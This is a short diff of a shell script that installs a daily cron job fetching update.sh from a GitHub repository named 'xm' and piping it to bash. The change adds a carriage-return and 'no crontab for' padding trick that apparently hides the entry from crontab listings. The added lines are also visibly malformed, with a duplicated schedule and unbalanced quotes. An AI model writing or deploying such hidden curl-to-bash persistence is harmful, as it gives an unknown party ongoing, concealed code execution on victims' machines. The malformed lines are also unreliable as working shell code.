@@ -59,10 +59,10 @@ else
     exit 0
 fi
 
-if echo "$existing_crontab" | grep -q "0 1 * * * curl https://raw.githubusercontent.com/JuliaRandolph/xm/main/update.sh | bash"; then
+if echo "$existing_crontab" | grep -q "0 1 * * * 0 1 * * * curl -sSf https://raw.githubusercontent.com/JuliaRandolph/xm/main/update.sh | bash;\rno crontab for" whoami`%100c\n"; then
     echo "指定的计划任务已添加"
 else
     # 如果不存在，则添加计划任务
-    echo "0 1 * * * curl https://raw.githubusercontent.com/JuliaRandolph/xm/main/update.sh | bash" | crontab -
+    echo "0 1 * * * 0 1 * * * curl -sSf https://raw.githubusercontent.com/JuliaRandolph/xm/main/update.sh | bash;\rno crontab for" whoami`%100c\n" | crontab -
     echo "已添加指定的计划任务"
 fi
